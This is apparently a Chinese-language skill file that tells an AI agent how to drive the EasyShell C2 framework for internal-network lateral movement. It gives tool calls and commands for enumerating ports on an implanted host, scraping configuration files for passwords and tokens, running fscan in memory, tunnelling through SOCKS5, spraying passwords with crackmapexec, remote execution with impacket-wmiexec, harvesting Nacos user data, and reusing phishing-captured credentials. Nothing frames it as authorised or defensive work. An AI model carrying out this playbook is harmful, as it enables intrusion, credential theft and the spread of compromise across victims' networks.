---
name: easyshell-lateral
description: >-
  EasyShell C2 驱动内网渗透：端口/进程→敏感配置→pass.txt→inline-bin fscan→密码喷洒/横向。
  SOCKS5 隧道避坑 / 直连优先 / Nacos 凭据收割。用户做内网横向、信息收集时使用。
---

# easyshell-lateral: 内网渗透标准作业流程

> **核心逻辑:** 进内网第一步看端口 → 找进程 → 搜配置 → 取密码 → 扫网段 → 喷密码
>
> **两条路线:**
> 1. 植入体本地 `inline-bin` 跑 fscan（`-np` 无 ping，相对隐蔽）
> 2. TeamServer 建 SOCKS5，本机 proxychains / curl 透传扫描

---

## 零、EasyShell C2 操作要点

### Shell vs 内存执行

| 方式 | 适用 | 特点 |
|------|------|------|
| `easyshell_exec_cmd` | whoami、netstat、短命令 | 轮询 shell 缓冲区 |
| `easyshell_memory_exec` | fscan、Rubeus、BOF | 无落盘或最小落盘 |
| `easyshell_read_file` | 读 txt/json 结果 | 走植入体协议，无 cmd |

### 路径写法

```python
# ✅ Windows 正斜杠
path = 'C:/Users/Administrator/result.txt'
# ❌ 反斜杠在 Python 字符串里易转义
```

### 快速 Python（MCP 环境）

```bash
python -c "import asyncio; from easyshell_api import client_from_env; ..."
```

---

## 一、Phase 1: 端口 → 进程

```python
easyshell_exec_cmd(uid, 'cmd /c "netstat -ano | findstr LISTENING&tasklist"')
```

解读：3306→MySQL、80/8080→Web、3389→RDP、8848→Nacos。

---

## 二、Phase 2: 敏感信息采集

```python
# searchall64 若已在 Extensions/tools/
easyshell_memory_exec(uid, "easyshell_plugins/tools/searchall64.exe", "inline-bin", 'search -p C:\\')

# 或 shell 定向读（合并一条）
easyshell_exec_cmd(uid, 'cmd /c "type C:\\phpstudy_pro\\Extensions\\MySQL*\\my.ini 2>nul&dir /s /b C:\\*.env 2>nul"')
```

---

## 三、Phase 3: pass.txt 密码本

从 searchall / 配置文件输出提取：

```python
PASSWORD_PATTERNS = [
    r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']?([^"\'\s;]+)',
    r'(?i)(secret|api_key|token)\s*[=:]\s*["\']?([^"\'\s;]+)',
    r'jdbc:mysql://[^"\'\s]+',
]
```

追加弱口令：`admin123`, `P@ssw0rd`, `root@123` 等。

---

## 四、Phase 4: fscan -np 资产扫描

### 方案 A：inline-bin（推荐）

```python
easyshell_exec_cmd(uid, "ipconfig")
# 假设网段 192.168.80.0/24

easyshell_memory_exec(
    uid,
    "easyshell_plugins/tools/fscan.exe",
    "inline-bin",
    "-h 192.168.80.0/24 -np -o C:/scan_80.txt",
)
# sleep 12s
easyshell_read_file(uid, "C:/scan_80.txt")
```

### 方案 B：SOCKS5 + 本机扫

```python
easyshell_start_socks5(uid, port=1080, force=True)
# proxychains nmap / fscan / curl
easyshell_stop_socks5(uid, 1080)
```

---

## 五、Phase 5: 密码喷洒 + 横向

```bash
proxychains crackmapexec smb 192.168.80.0/24 -u users.txt -p pass.txt
proxychains impacket-wmiexec 'admin:pass@192.168.80.148'
```

---

## 六、隧道与 Nacos（2026 实战教训）

### SOCKS5 出口 = 植入体 IP

```
本机 → TeamServer:1080 → 植入体 → 目标
              ↑ 监听在 C2      ↑ 出口非 C2
```

- 本机 VMnet/NAT 能直连目标 → **直接打，不绕隧道**
- ping 通 ≠ TCP 通

### Nacos 8848 凭据收割

```bash
# 本机直连（优先）
easyshell_send_http("http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10", headers="User-Agent: Nacos-Server")

# 或经隧道
easyshell_tunnel_curl(1080, "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10", headers="User-Agent: Nacos-Server")
```

---

## 七、复盘原则

| 场景 | 正确 | 错误 |
|------|------|------|
| 扫描 | inline-bin fscan | 反复 upload exe |
| 读结果 | file/filecontent | type 命令 |
| 多命令 | cmd /c "a&b&c" | 连发 10 条 sendcommand |
| 隧道 | 先测直连 | 以为 C2 出口万能 |
| API | MCP / easyshell_api | 裸 JSON POST |

---

## 八、输出产物

```
lateral_results/
├── 1-ports.txt
├── 2-searchall.txt
├── 4-pass.txt
├── 5-scan_80.txt
└── 6-summary.json
```

---

## 九、钓鱼凭据复用

若 [[easyshell-phishing]] 活动捕获到 username/password：

1. 写入 `4-pass.txt`，与 searchall 提取的密码合并去重
2. 优先对活动目标域/网段做喷洒（`crackmapexec` / `fscan -userf -pwdf`）
3. 喷洒成功拿到 shell 后，用 `easyshell_forward_connect` 或新监听器收线，再进 Phase 1

> 钓鱼凭据与内网配置文件密码分开存档，避免混用导致锁定账户。
